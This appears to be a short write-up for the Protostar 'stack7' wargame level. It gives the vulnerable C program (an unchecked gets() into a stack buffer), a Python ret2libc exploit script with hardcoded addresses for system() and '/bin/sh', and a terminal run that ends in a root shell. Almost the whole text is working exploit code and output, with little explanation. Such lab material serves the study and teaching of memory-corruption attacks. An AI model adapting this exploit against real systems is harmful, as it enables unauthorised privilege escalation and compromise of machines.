Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Here is the exploit script (saved as `st7.py`):
```python
import struct
buffstart=0xbffff75c
ebpval=0xbffff7a8
padding='a'*(ebpval-buffstart)
ebpnewval=struct.pack('<I',ebpval+0xf0)

eip=struct.pack('<I',0x8048544)
binshAddr=struct.pack('<I',0xb7e97000+0x11f3bf)
eip2=struct.pack('<I',0xb7ecffb0) # address of system
retaddr_after_system=struct.pack('<I',0x8048550) # doesn't matter tho
output = padding+ebpnewval+eip+eip2+retaddr_after_system+binshAddr
print output
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ (python ~/st7.py;cat) | ./stack7
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaD�aaaaaaaa����D����P��c��
whoami
root
Segmentation fault
```
